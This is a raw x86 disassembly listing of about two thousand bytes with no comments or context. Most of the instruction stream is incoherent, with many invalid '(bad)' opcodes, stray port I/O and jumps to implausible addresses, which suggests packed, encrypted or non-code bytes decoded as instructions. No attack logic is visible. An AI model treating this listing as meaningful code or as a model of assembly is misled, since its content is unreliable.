  404384:	mov    cs,WORD PTR [edx+0x592a8a28]
  40438a:	test   DWORD PTR [ebx+0x7ff689e0],ecx
  404390:	arpl   WORD PTR [ecx-0x30],dx
  404393:	cmp    ecx,DWORD PTR [edi-0x28816c37]
  404399:	mov    al,0x6a
  40439b:	push   0xffffffd0
  40439d:	jmp    0x82116212
  4043a2:	sbb    al,0x9e
  4043a4:	push   eax
  4043a5:	mov    ebp,db5
  4043a8:	inc    esi
  4043a9:	imul   ecx,DWORD PTR [esi],0x12e76adb
  4043af:	mov    eax,ds:0x97d7a377
  4043b4:	dec    ecx
  4043b5:	sar    BYTE PTR [edx+0xe0de0b5],1
  4043bb:	mov    ch,BYTE PTR [ebp+0x6e]
  4043be:	cmp    dh,BYTE PTR [esi+0x16f2e7e]
  4043c4:	add    DWORD PTR [ebp+0x54],0xe3da9a96
  4043cb:	add    al,0x52
  4043cd:	ret    0x286e
  4043d0:	repnz xchg ebp,eax
  4043d2:	and    dl,BYTE PTR [esi+ebx*1-0x47]
  4043d6:	scas   eax,DWORD PTR es:[edi]
  4043d7:	mov    ecx,ebx
  4043d9:	cli    
  4043da:	lods   al,BYTE PTR ds:[esi]
  4043db:	xor    ch,dl
  4043dd:	xchg   esi,eax
  4043de:	sbb    BYTE PTR [edx],dh
  4043e0:	lock lods al,BYTE PTR ds:[esi]
  4043e2:	cs aam 0x3b
  4043e5:	call   0x6ca17778
  4043ea:	adc    eax,0xd6cdb838
  4043ef:	push   edi
  4043f0:	pop    ecx
  4043f1:	add    BYTE PTR ds:0x5575d8ee,0xfb
  4043f8:	loopne 0x4043ff
  4043fa:	pop    ecx
  4043fb:	inc    eax
  4043fc:	int    0x20
  4043fe:	call   0x44cab037
  404403:	jae    0x404443
  404405:	xor    eax,0xd04238fc
  40440a:	loopne 0x4043b4
  40440c:	shl    DWORD PTR [ebx],1
  40440e:	xor    DWORD PTR [ebx-0x3],ebp
  404411:	sbb    BYTE PTR [ebx],0xb
  404414:	add    edx,DWORD PTR [esi]
  404416:	pop    ss
  404417:	nop
  404418:	cmp    BYTE PTR [ebx-0x80],ch
  40441b:	into   
  40441c:	pop    ecx
  40441d:	imul   ecx,DWORD PTR [eax-0x49],0x24609e78
  404424:	out    dx,al
  404425:	push   edx
  404426:	mov    dh,0xd7
  404428:	fadd   DWORD PTR [ebx+0x42]
  40442b:	ret    
  40442c:	jmp    0x39a2d032
  404431:	js     0x404489
  404433:	bound  edx,QWORD PTR [eax-0x47a6b11a]
  404439:	lods   al,BYTE PTR ds:[esi]
  40443a:	fisubr WORD PTR [ecx+0x5d2e7f52]
  404440:	rcr    DWORD PTR [edx-0x31d41cc1],1
  404446:	idiv   BYTE PTR [ecx]
  404448:	aad    0x61
  40444a:	popf   
  40444b:	push   esi
  40444c:	or     esi,edi
  40444e:	bound  edi,QWORD PTR [edx]
  404450:	mov    ah,ah
  404452:	call   0xb507f505
  404457:	in     eax,0x60
  404459:	enter  0x463c,0x6
  40445d:	data16 daa 
  40445f:	stos   DWORD PTR es:[edi],eax
  404460:	adc    eax,0x52c7d435
  404465:	inc    edi
  404466:	imul   ebx,DWORD PTR [eax],0xdc9286a1
  40446c:	sub    al,0x31
  40446f:	lds    ebx,FWORD PTR [esi]
  404471:	adc    esi,ebp
  404473:	js     0x4044a9
  404475:	inc    eax
  404476:	sub    eax,0x178b400d
  40447b:	push   ds
  40447c:	or     ecx,ecx
  40447e:	xchg   BYTE PTR [edi-0x39685e41],bl
  404484:	lahf   
  404485:	iret   
  404486:	jle    0x4044ae
  404488:	fcomp  QWORD PTR [edi+0x75]
  40448b:	sahf   
  40448c:	sub    DWORD PTR ds:0x8ca48a78,ecx
  404492:	bound  edx,QWORD PTR [edx-0x28]
  404495:	aad    0xf4
  404497:	dec    esi
  404498:	or     eax,0xd64392f1
  40449d:	xchg   ecx,eax
  40449e:	sub    esp,DWORD PTR [eax+0x58bac9eb]
  4044a4:	cmp    eax,0x4d13ea5b
  4044a9:	in     al,dx
  4044aa:	sbb    ah,BYTE PTR [ecx]
  4044ac:	and    DWORD PTR [edi],esp
  4044ae:	fistp  QWORD PTR [esi-0x3196d5d8]
  4044b4:	inc    esp
  4044b5:	lahf   
  4044b6:	ins    BYTE PTR es:[edi],dx
  4044b7:	xchg   esp,eax
  4044b8:	ds frstpm(287 only) 
  4044bb:	call   0x91e870d9
  4044c0:	in     eax,0x8e
  4044c2:	repnz in eax,dx
  4044c4:	ret    0xb031
  4044c7:	fbld   TBYTE PTR [ebp+0x11]
  4044ca:	cmc    
  4044cb:	sar    DWORD PTR [edx+0x111f55bb],0xb
  4044d2:	imul   edx,DWORD PTR [edi+ebp*1-0x2e49bbf1],0x78c71e9f
  4044dd:	retf   
  4044de:	mov    ds:0x9bc2a54c,eax
  4044e3:	sti    
  4044e4:	stos   BYTE PTR es:[edi],al
  4044e5:	xor    DWORD PTR [edi+0x3cd9a383],esi
  4044eb:	xchg   edx,eax
  4044ec:	loope  0x4044f0
  4044ee:	adc    eax,0xfb55e048
  4044f3:	das    
  4044f4:	push   ebp
  4044f5:	pusha  
  4044f6:	push   ss
  4044f7:	push   esp
  4044f8:	dec    eax
  4044f9:	pop    ebp
  4044fa:	scas   eax,DWORD PTR es:[edi]
  4044fb:	push   esp
  4044fc:	xchg   edi,eax
  4044fd:	test   DWORD PTR [edx+eax*4+0x4053f379],eax
  404504:	std    
  404505:	push   0x3e
  404507:	xor    DWORD PTR [eax+0x3b],ecx
  40450a:	cmp    dl,BYTE PTR [edi-0x4a9195e0]
  404510:	xchg   esi,eax
  404511:	xchg   ecx,eax
  404512:	jo     0x4044ab
  404514:	fld    DWORD PTR [esi]
  404516:	pop    edx
  404517:	test   eax,0xfc29a7d3
  40451c:	in     eax,dx
  40451d:	cld    
  40451e:	test   al,0x57
  404520:	fnstenv [esi]
  404522:	mov    edx,0x4de6d381
  404527:	(bad)  
  404528:	pushf  
  404529:	jne    0x4044bc
  40452b:	push   esp
  40452c:	(bad)  
  40452d:	pop    ss
  40452e:	pop    ecx
  40452f:	mov    ds:0x5df0dc95,eax
  404534:	icebp  
  404535:	adc    DWORD PTR [eax+0x30],ecx
  404538:	scas   eax,DWORD PTR es:[edi]
  404539:	and    edi,0xffffff98
  40453c:	or     ch,al
  40453e:	jnp    0x4044c6
  404540:	xchg   ebx,edi
  404542:	aam    0xb9
  404544:	or     BYTE PTR [ecx+0x11],dh
  404547:	shl    BYTE PTR [edx+0x50],1
  40454a:	xchg   ecx,edx
  40454c:	ins    DWORD PTR es:[edi],dx
  40454d:	(bad)  [edx+0x266c9d79]
  404553:	and    al,0xb4
  404555:	gs push eax
  404557:	repz sbb DWORD PTR [eax-0x7b6315f1],edx
  40455e:	ins    DWORD PTR es:[edi],dx
  40455f:	mov    ?,WORD PTR [ecx+0x6c35c093]
  404565:	sbb    DWORD PTR [ebx+0x31],eax
  404568:	mov    ah,0x8c
  40456a:	pop    edi
  40456b:	mov    eax,0xf288168e
  404570:	repz cld 
  404572:	sbb    ch,0x70
  404575:	or     DWORD PTR [esi-0x7567c5e3],0x3e007f7d
  40457f:	xchg   esp,eax
  404580:	shl    BYTE PTR [eax+0x2f],0x6e
  404584:	nop    esi
  404587:	ja     0x40453f
  404589:	repnz rol DWORD PTR [ebx+eax*8+0x1546d322],1
  404591:	dec    edx
  404592:	dec    esi
  404593:	data16 xchg dl,ah
  404596:	cmc    
  404597:	pop    esi
  404598:	inc    esi
  404599:	test   al,0xb5
  40459b:	push   0x15
  40459d:	fwait
  40459e:	(bad)  
  40459f:	shl    DWORD PTR [edi-0x4b],1
  4045a2:	aad    0xf
  4045a4:	push   ebx
  4045a5:	mov    ah,0x58
  4045a7:	mov    bl,0x7b
  4045a9:	out    0xa0,al
  4045ab:	bound  edx,QWORD PTR [ebx+edi*8]
  4045ae:	inc    eax
  4045af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045b0:	sbb    ecx,DWORD PTR [ebp+0x5362be70]
  4045b6:	fs aaa 
  4045b8:	out    dx,eax
  4045b9:	push   eax
  4045ba:	popf   
  4045bb:	mov    edx,0xeeca8db9
  4045c0:	xchg   esi,eax
  4045c1:	aam    0xe1
  4045c3:	int3   
  4045c4:	xor    eax,0xb497aca5
  4045c9:	test   DWORD PTR [ebp+0x43134bad],edi
  4045cf:	scas   al,BYTE PTR es:[edi]
  4045d0:	sub    DWORD PTR [ebx+0x44],edi
  4045d3:	adc    BYTE PTR ds:0xd250f3fe,0x1
  4045da:	cdq    
  4045db:	repz push 0x3f8d5649
  4045e1:	arpl   WORD PTR [esi+ebp*4-0x611a2ec7],bx
  4045e8:	sbb    DWORD PTR [edx+edi*8+0x7799f662],esp
  4045ef:	mov    edx,0x48c82cbb
  4045f4:	dec    esp
  4045f5:	retf   
  4045f6:	(bad)  
  4045f7:	adc    BYTE PTR [ebx+0x4b300cb1],0x6b
  4045fe:	inc    eax
  4045ff:	xchg   edi,eax
  404600:	cdq    
  404601:	or     esi,DWORD PTR [ebx]
  404603:	fsubr  DWORD PTR [edi]
  404605:	mov    ebp,0xba5dea20
  40460a:	sbb    ecx,DWORD PTR ds:0x2f3e978f
  404610:	addr16 inc edx
  404612:	jecxz  0x4045b2
  404614:	push   DWORD PTR [eax+eax*8+0x1]
  404618:	xchg   edx,eax
  404619:	(bad)  
  40461a:	jl     0x404623
  40461c:	ret    
  40461d:	mov    cl,0x3f
  40461f:	aaa    
  404620:	push   ss
  404621:	das    
  404622:	cwde   
  404623:	pusha  
  404624:	adc    ch,ch
  404626:	jne    0x404663
  404628:	ror    edi,0x6c
  40462b:	jp     0x404601
  40462d:	jo     0x40461e
  40462f:	int    0x19
  404631:	imul   ebx,DWORD PTR ds:0x7c82cf26,0xffffff97
  404638:	shl    DWORD PTR [edx+0xb],cl
  40463b:	sub    bh,BYTE PTR [ecx-0x15]
  40463e:	pop    esp
  40463f:	or     al,BYTE PTR [edi-0x4bdceebd]
  404645:	into   
  404646:	out    dx,al
  404647:	add    eax,0x839169b1
  40464c:	push   edi
  40464d:	(bad)  
  40464e:	xchg   esi,eax
  40464f:	mov    dl,0xe6
  404651:	sub    eax,0x5b6308eb
  404656:	xchg   edi,eax
  404657:	outs   dx,BYTE PTR ds:[esi]
  404658:	mov    bl,0x4a
  40465a:	xor    bl,bl
  40465c:	(bad)  
  40465e:	sub    BYTE PTR [ebx],dl
  404660:	out    0x6a,al
  404662:	pusha  
  404663:	addr16 sbb edi,ecx
  404666:	mov    esi,0x67656f51
  40466b:	add    eax,0x8ecb9e7f
  404670:	sbb    ebx,esp
  404672:	lods   al,BYTE PTR ds:[esi]
  404673:	cs (bad) 
  404675:	outs   dx,BYTE PTR ds:[esi]
  404676:	test   al,0x99
  404678:	int3   
  404679:	hlt    
  40467a:	inc    esp
  40467b:	daa    
  40467c:	mov    ds:0xc8b1f192,al
  404681:	dec    edi
  404682:	test   DWORD PTR [edx+0x5f],esp
  404685:	pop    ebx
  404686:	adc    al,0x3e
  404688:	or     eax,0x6e323153
  40468d:	jge    0x40468e
  40468f:	popa   
  404690:	pushf  
  404691:	addr16 popf 
  404693:	lds    ecx,FWORD PTR [ebp+0x19]
  404696:	inc    DWORD PTR [esi-0xd94adb2]
  40469c:	adc    eax,DWORD PTR [ebx]
  40469e:	xchg   ebp,eax
  40469f:	lahf   
  4046a0:	or     edi,DWORD PTR [edx-0x78]
  4046a3:	ret    0x8f93
  4046a6:	rcr    DWORD PTR [edi+0x1db5cb22],cl
  4046ac:	inc    ebx
  4046ad:	(bad)  
  4046ae:	and    BYTE PTR [eax+0x4d0a7061],bh
  4046b4:	mov    eax,0x4784b0dd
  4046b9:	jecxz  0x40464c
  4046bb:	ficomp WORD PTR [ecx+0x410e8ee6]
  4046c1:	adc    al,0xa2
  4046c3:	test   al,0x38
  4046c5:	out    0xbc,eax
  4046c7:	aaa    
  4046c8:	lea    esi,[eax-0x613999e6]
  4046ce:	rcl    DWORD PTR [edx-0x1a],0x8d
  4046d2:	enter  0x96ca,0x4f
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	fild   QWORD PTR [ecx]
  4046d9:	xor    BYTE PTR [ecx],0x48
  4046dc:	mov    esp,0x36e54895
  4046e1:	inc    eax
  4046e2:	and    DWORD PTR [esi],edi
  4046e4:	scas   al,BYTE PTR es:[edi]
  4046e5:	push   ebx
  4046e6:	test   BYTE PTR [ebx+0x16dea537],cl
  4046ec:	ss jno 0x4046ac
  4046ef:	clc    
  4046f0:	aas    
  4046f1:	dec    esi
  4046f2:	cmp    edx,esi
  4046f4:	and    eax,0x597f3692
  4046f9:	cmc    
  4046fa:	test   eax,0xc8e55e66
  4046ff:	stos   DWORD PTR es:[edi],eax
  404700:	lods   eax,DWORD PTR ds:[esi]
  404701:	and    DWORD PTR [eax+0x105f1367],0xc34ff0b2
  40470b:	mov    al,0x3d
  40470d:	adc    DWORD PTR [edi+eiz*1],ebx
  404710:	dec    esp
  404711:	jle    0x404758
  404713:	sbb    eax,0xc1761b2a
  404718:	sub    DWORD PTR [eax+0xc],esp
  40471b:	test   DWORD PTR [edx+0x4d],eax
  40471e:	ds jmp 0x404792
  404721:	nop
  404722:	mov    ecx,0x535cc394
  404727:	ret    
  404728:	lock sub esp,DWORD PTR [ebx+ebp*8+0x37]
  40472d:	inc    eax
  40472e:	loop   0x404790
  404730:	imul   edx,DWORD PTR [ebx+0x32],0x40
  404734:	jl     0x404735
  404736:	push   cs
  404737:	popf   
  404738:	popa   
  404739:	je     0x404724
  40473b:	out    0xf,eax
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428253,0x42820f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42822f
  404753:	or     DWORD PTR ds:0x42832f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0x709f665b
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [esi+0x22],dh
  40477b:	xor    BYTE PTR ss:[ebx],ch
  40477e:	test   al,0xa1
  404780:	pop    es
  404781:	aad    0xe9
  404783:	cmc    
  404784:	test   eax,0x507a66ab
  404789:	fild   DWORD PTR [edx-0x4adb33c5]
  40478f:	cdq    
  404790:	jmp    0xab674363
  404795:	pop    ecx
  404796:	xchg   esp,eax
  404797:	mov    bh,0x7
  404799:	xchg   al,ah
  40479b:	jle    0x40478f
  40479d:	cmp    al,0x3b
  40479f:	test   eax,0xf8420ce2
  4047a4:	ins    BYTE PTR es:[edi],dx
  4047a5:	jo     0x40479e
  4047a7:	and    BYTE PTR ds:0x59d8e0c6,0xb9
  4047ae:	or     al,0xf6
  4047b0:	xor    eax,0x2390f427
  4047b5:	out    dx,eax
  4047b6:	push   ds
  4047b7:	sbb    dh,bh
  4047b9:	xchg   esi,eax
  4047ba:	sbb    dl,BYTE PTR [esi+0x4c68ee4c]
  4047c0:	push   esi
  4047c1:	ins    BYTE PTR es:[edi],dx
  4047c2:	test   ebp,edi
  4047c4:	retf   0xf264
  4047c7:	fsincos 
  4047c9:	loopne 0x4047be
  4047cb:	add    al,0x97
  4047cd:	lock mov esi,0x7c34091
  4047d3:	adc    DWORD PTR [eax],ebp
  4047d5:	in     eax,0x97
  4047d7:	sbb    dl,BYTE PTR [ebp-0x568ac9cb]
  4047dd:	ins    DWORD PTR es:[edi],dx
  4047de:	in     eax,0x5e
  4047e0:	mov    bl,0xaa
  4047e2:	ins    DWORD PTR es:[edi],dx
  4047e3:	fnstsw WORD PTR [edi-0x10]
  4047e6:	js     0x404823
  4047e8:	in     eax,dx
  4047e9:	mov    ebp,0x8c734dbb
  4047ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ef:	inc    ebp
  4047f0:	jge    0x404849
  4047f2:	js     0x404812
  4047f4:	mov    DWORD PTR [ebx],ebx
  4047f6:	imul   esp,DWORD PTR [esi],0x79eb6155
  4047fc:	jecxz  0x40484f
  4047fe:	(bad)  
  404800:	mov    ebx,DWORD PTR [esp+eax*2]
  404803:	out    0x57,al
  404805:	jo     0x40487d
  404807:	fimul  WORD PTR [ebx]
  404809:	inc    eax
  40480a:	xchg   esp,eax
  40480b:	pop    ecx
  40480c:	dec    ebx
  40480d:	shl    BYTE PTR [esi-0x5d],1
  404810:	loope  0x40486a
  404812:	rol    BYTE PTR [esi-0x2c54009b],cl
  404818:	mov    bh,0x6a
  40481a:	adc    DWORD PTR [esi],ecx
  40481c:	shr    edx,cl
  40481e:	sahf   
  40481f:	mov    eax,ds:0xfa90bb5b
  404824:	imul   ecx,DWORD PTR [esi+0x7f33bee7],0x657c3eac
  40482e:	mov    al,ds:0x4bb2c60b
  404833:	xchg   ebx,eax
  404834:	gs popf 
  404836:	adc    DWORD PTR [ebx+0x30],esp
  404839:	in     eax,0xf6
  40483b:	lahf   
  40483c:	loope  0x40485a
  40483e:	mov    eax,ds:0xbaddc017
  404843:	xchg   ebx,eax
  404844:	and    esi,DWORD PTR [ebx+0x58b56b1c]
  40484a:	jo     0x4048bf
  40484c:	test   DWORD PTR [eax],ebx
  40484e:	mov    al,0x12
  404850:	push   edi
  404851:	jo     0x4047d5
  404853:	mov    BYTE PTR [ebx+0x14de8ea6],dl
  404859:	xchg   esp,eax
  40485a:	xchg   esp,eax
  40485b:	test   ecx,edx
  40485d:	fimul  DWORD PTR [ebx+0xa]
  404860:	dec    ebx
  404861:	out    dx,al
  404862:	std    
  404863:	jge    0x4048b4
  404865:	aas    
  404866:	mov    esp,DWORD PTR [ecx+0x10d16e1a]
  40486c:	shl    BYTE PTR [edx],cl
  40486e:	dec    ebx
  40486f:	dec    esp
  404870:	sbb    cl,BYTE PTR [edi]
  404872:	or     al,0xda
  404874:	sbb    dh,BYTE PTR [esi+0x20]
  404877:	(bad)  
  404878:	lods   al,BYTE PTR ds:[esi]
  404879:	shr    ah,0xf3
  40487c:	call   0x781bbb63
  404881:	and    esp,esi
  404883:	int3   
  404884:	out    0xe8,eax
  404886:	jp     0x4048a1
  404888:	repnz cdq 
  40488a:	mov    DWORD PTR [ecx+edi*2-0x5042aee6],0xf870d205
  404895:	sbb    DWORD PTR [ebx],esi
  404897:	inc    DWORD PTR [ecx+0x64]
  40489a:	ficomp WORD PTR ds:0x9513708d
  4048a0:	cmp    BYTE PTR [edi],ch
  4048a2:	cmp    DWORD PTR [edx-0xb],esp
  4048a5:	leave  
  4048a6:	cmp    al,0xb7
  4048a8:	in     eax,0xfd
  4048aa:	jae    0x404911
  4048ac:	lds    edx,FWORD PTR [eax]
  4048ae:	popa   
  4048af:	add    DWORD PTR [eax+0x65],ebp
  4048b2:	add    al,0x64
  4048b4:	out    0x7d,al
  4048b6:	pop    edx
  4048b7:	sub    eax,esp
  4048b9:	rcl    al,0xe1
  4048bc:	jmp    0x2084c684
  4048c1:	shl    BYTE PTR [ebx],0x50
  4048c4:	pop    esi
  4048c5:	xchg   ebp,eax
  4048c6:	xchg   bl,cl
  4048c8:	mov    al,ds:0x9c1f1ca8
  4048cd:	mov    ah,0x9
  4048cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d0:	mov    dl,0xe6
  4048d2:	push   ebx
  4048d3:	jmp    0x2b55:0x6001ff67
  4048da:	sub    dl,BYTE PTR [ecx]
  4048dc:	jmp    0x4048bd
  4048de:	inc    edi
  4048df:	mov    ebp,0x738c71d
  4048e4:	cli    
  4048e5:	rcr    BYTE PTR [edx+0x68],1
  4048e8:	retf   
  4048e9:	pusha  
  4048ea:	cdq    
  4048eb:	push   ecx
  4048ec:	loope  0x4048e9
  4048ee:	jnp    0x404942
  4048f0:	xchg   edi,eax
  4048f1:	bound  esi,QWORD PTR [edi+ebx*4]
  4048f4:	repnz mov ds:0xbf3aaf44,al
  4048fa:	cli    
  4048fb:	retf   
  4048fc:	push   ebx
  4048fd:	cmp    BYTE PTR [ecx],al
  4048ff:	mov    esi,0x3351d338
  404904:	xchg   edi,eax
  404905:	xor    DWORD PTR [edi-0x8db1fcb],ebx
  40490b:	cmp    bh,BYTE PTR [eax]
  40490d:	push   edx
  40490e:	sub    al,0xf8
  404910:	pop    esp
  404911:	gs mov ch,0xb5
  404914:	dec    ecx
  404915:	sbb    dh,BYTE PTR [edx]
  404917:	aaa    
  404918:	aas    
  404919:	add    DWORD PTR [esi-0x45],edi
  40491c:	ret    0x5577
  40491f:	fdivp  st(6),st
  404921:	or     eax,0x6866b2d9
  404926:	sbb    edx,DWORD PTR [esi]
  404928:	jne    0x4048f7
  40492a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492b:	cwde   
  40492c:	inc    eax
  40492d:	xor    bh,bh
  40492f:	jne    0x404941
  404931:	add    cl,bh
  404933:	sbb    bl,BYTE PTR [edx]
  404935:	addr16 cmp al,0xb9
  404938:	aaa    
  404939:	std    
  40493a:	push   eax
  40493b:	iret   
  40493c:	mov    al,ds:0x6a47633d
  404941:	mov    edx,0x2b9acee
  404946:	pop    eax
  404947:	rol    BYTE PTR [ebx+edi*8+0x5f99c2f9],cl
  40494e:	(bad)  
  40494f:	in     eax,dx
  404950:	push   ebx
  404951:	(bad)  
  404953:	repnz xor cl,al
  404956:	cld    
  404957:	hlt    
  404958:	aas    
  404959:	(bad)  
  40495a:	sbb    al,0xef
  40495c:	cwde   
  40495d:	jmp    0x404976
  40495f:	ds dec esp
  404961:	scas   al,BYTE PTR es:[edi]
  404962:	ins    BYTE PTR es:[edi],dx
  404963:	cmp    esp,DWORD PTR [esi-0xfe39251]
  404969:	or     ecx,DWORD PTR [ebp-0x409317df]
  40496f:	imul   ebp,DWORD PTR [esi],0xfffffff0
  404972:	jl     0x4049de
  404974:	add    eax,0x8dff3b19
  404979:	dec    edi
  40497a:	enter  0x8d40,0xc
  40497e:	dec    ebx
  40497f:	xchg   ebx,eax
  404980:	in     eax,dx
  404981:	test   al,0x57
  404983:	sti    
  404984:	aad    0x48
  404986:	sar    DWORD PTR [edi-0x36482e7d],1
  40498c:	mov    dl,0x20
  40498e:	xor    eax,0xb7bf0d06
  404994:	push   ecx
  404995:	aaa    
  404996:	push   ss
  404997:	stc    
  404998:	adc    BYTE PTR [ecx-0xa49f813],dh
  40499e:	and    eax,0x4bbd4f32
  4049a3:	ss js  0x404935
  4049a6:	and    al,0xb1
  4049a8:	out    dx,eax
  4049a9:	or     DWORD PTR [esi+0x77466864],edi
  4049af:	mov    BYTE PTR [eax-0x64],ah
  4049b2:	std    
  4049b3:	add    ebp,0xffffffdb
  4049b6:	adc    DWORD PTR [edx],esp
  4049b8:	rcr    DWORD PTR [eax],0xe3
  4049bb:	pop    esp
  4049bc:	ins    DWORD PTR es:[edi],dx
  4049bd:	mov    edx,0xd28b12dc
  4049c2:	and    al,0x9c
  4049c4:	fadd   DWORD PTR [edx]
  4049c6:	mov    edx,0xa235eeec
  4049cb:	data16 das 
  4049cd:	inc    esp
  4049ce:	and    al,0x64
  4049d0:	fucomip st,st(3)
  4049d2:	fucomp st(3)
  4049d4:	or     dl,bl
  4049d6:	dec    edx
  4049d7:	cli    
  4049d8:	or     al,0xc
  4049da:	out    0xc7,al
  4049dc:	inc    ebp
  4049dd:	sbb    BYTE PTR [bp+0x5e],bl
  4049e1:	jecxz  0x404a4b
  4049e3:	enter  0x79cb,0xbc
  4049e7:	shl    DWORD PTR [edx-0x4c],cl
  4049ea:	mov    al,0x19
  4049ec:	aaa    
  4049ed:	and    eax,0x1add30fc
  4049f2:	or     eax,0x2db9f87f
  4049f7:	push   ebx
  4049f8:	or     dh,BYTE PTR [ecx+ecx*4+0xe6720a3]
  4049ff:	jl     0x4049bf
  404a01:	fisub  DWORD PTR [edi+eax*2+0x4d945d9c]
  404a08:	xor    ebp,DWORD PTR [ebp-0x11]
  404a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a0c:	fwait
  404a0d:	(bad)  
  404a0e:	sbb    BYTE PTR [edx-0x4321e5d8],cl
  404a14:	jge    0x404a2d
  404a16:	xlat   BYTE PTR ds:[ebx]
  404a17:	push   esp
  404a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a19:	(bad)
  404a1c:	popf   
  404a1d:	add    esi,ebx
  404a1f:	push   ecx
  404a20:	retf   0x648c
  404a23:	cdq    
  404a24:	adc    ebp,DWORD PTR [ecx]
  404a26:	dec    esi
  404a27:	xchg   esi,eax
  404a28:	bound  ebp,QWORD PTR [ebx+0x6bb5400a]
  404a2e:	and    al,0xa1
  404a30:	(bad)  
  404a31:	out    dx,eax
  404a32:	pop    esp
  404a33:	sahf   
  404a34:	inc    edi
  404a35:	dec    edi
  404a36:	ret    
  404a37:	daa    
  404a38:	div    BYTE PTR [ecx]
  404a3a:	addr16 jl 0x404a3f
  404a3d:	js     0x404a4c
  404a3f:	jge    0x404a72
  404a41:	(bad)  
  404a42:	lds    eax,FWORD PTR [ebp-0x54]
  404a45:	inc    esp
  404a46:	xor    BYTE PTR [ebp+0x5d],cl
  404a49:	pop    ss
  404a4a:	loop   0x404ac6
  404a4c:	fwait
  404a4d:	adc    edi,esi
  404a4f:	aam    0xce
  404a51:	mov    ebx,0xc17b3c35
  404a56:	mov    bh,0x45
  404a58:	outs   dx,BYTE PTR ds:[esi]
  404a59:	cld    
  404a5a:	ins    DWORD PTR es:[edi],dx
  404a5b:	(bad)  
  404a5c:	imul   ecx,DWORD PTR [ebp+0x4f48ea26],0x2b
  404a63:	into   
  404a64:	adc    BYTE PTR [edi],cl
  404a66:	xchg   edx,eax
  404a67:	ins    DWORD PTR es:[edi],dx
  404a68:	leave  
  404a69:	dec    ebp
  404a6a:	dec    ebx
  404a6b:	adc    al,0x42
  404a6d:	and    ecx,DWORD PTR [esp+edi*8+0x17]
  404a71:	cwde   
  404a72:	mov    dl,0xbd
  404a74:	dec    ebx
  404a75:	pop    ebp
  404a76:	sahf   
  404a77:	xor    eax,0xc751c23a
  404a7c:	sub    bl,dh
  404a7e:	enter  0xd6d6,0x3d
  404a82:	sbb    eax,0x18490f0e
  404a87:	or     eax,0x2f4f9ad0
  404a8c:	pusha  
  404a8d:	rcr    DWORD PTR [eax+0x689c6255],1
  404a93:	lock mov DWORD PTR ds:0x112ce2c3,edx
  404a9a:	mov    ebx,0xa6821bae
  404a9f:	fdiv   QWORD PTR [esi]
  404aa1:	imul   esi,esi,0xffffffd5
  404aa4:	fsub   st(1),st
  404aa6:	mov    esp,0x769dfcda
  404aab:	mov    esp,0xdf8668c9
  404ab0:	pop    edx
  404ab1:	cmc    
  404ab2:	inc    esi
  404ab3:	xchg   edi,eax
  404ab4:	xchg   esp,eax
  404ab5:	xor    al,0xf9
  404ab7:	xchg   edi,eax
  404ab8:	dec    DWORD PTR [edx+esi*2]
  404abb:	lods   al,BYTE PTR ds:[esi]
  404abc:	sbb    ecx,eax
  404abe:	push   ds
  404abf:	fistp  QWORD PTR [eax+0x2d]
  404ac2:	out    dx,eax
  404ac3:	fcompp 
  404ac5:	inc    esi
  404ac6:	pop    es
  404ac7:	jbe    0x404b2b
  404ac9:	mov    WORD PTR ds:0xd1f69af4,fs
  404acf:	sbb    BYTE PTR [esi-0x7d0694b5],al
  404ad5:	fs call 0xf427:0x1821e43
  404add:	sub    dh,BYTE PTR ds:[ebp+0x5c773ca9]
  404ae4:	in     eax,0x97
  404ae6:	push   ebp
  404ae7:	add    edx,ebp
  404ae9:	int    0xf3
  404aeb:	xchg   esi,eax
  404aec:	jo     0x404a9a
  404aee:	or     ebp,DWORD PTR [edi-0x2ea3ccf3]
  404af4:	ins    DWORD PTR es:[edi],dx
  404af5:	dec    edi
  404af6:	and    DWORD PTR [ecx],eax
  404af8:	les    esp,FWORD PTR [edi-0x69]
  404afb:	pop    ebp
  404afc:	cli    
  404afd:	cmp    eax,DWORD PTR [esi]
  404aff:	sbb    DWORD PTR [esi],eax
  404b01:	jae    0x404ad3
  404b03:	loopne 0x404ac6
  404b05:	push   es
  404b06:	mov    ecx,0xce091392
  404b0b:	sub    ecx,edi
  404b0d:	ins    BYTE PTR es:[edi],dx
  404b0e:	pop    esi
  404b0f:	sbb    DWORD PTR [ecx-0x3a252221],eax
  404b15:	fistp  QWORD PTR [edi-0x73]
  404b18:	push   0x8d9d6db5
  404b1d:	aam    0xc4
  404b1f:	xchg   esp,eax
  404b20:	mov    ds:0xd2f26edb,al
  404b25:	push   ebx
  404b26:	out    dx,eax
  404b27:	jg     0x404acb
  404b29:	pop    ecx
  404b2a:	cmovbe ebp,DWORD PTR [edi+0x2a159fe8]
  404b31:	pop    edx
  404b32:	inc    esp
  404b33:	cdq    
  404b34:	jns    0x404abf
  404b36:	push   ds
  404b37:	(bad)  
  404b38:	repnz cmp al,0x8b
  404b3b:	or     ecx,DWORD PTR [ebx+0x7d310453]
  404b41:	in     al,0x81
  404b43:	add    eax,0x428243
  404b48:	mov    bh,0x82
  404b4a:	inc    edx
  404b4b:	add    BYTE PTR [ebx],dh
  404b4d:	shr    cl,cl
  404b4f:	fld    DWORD PTR [ebx]
  404b51:	add    BYTE PTR [eax],al
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
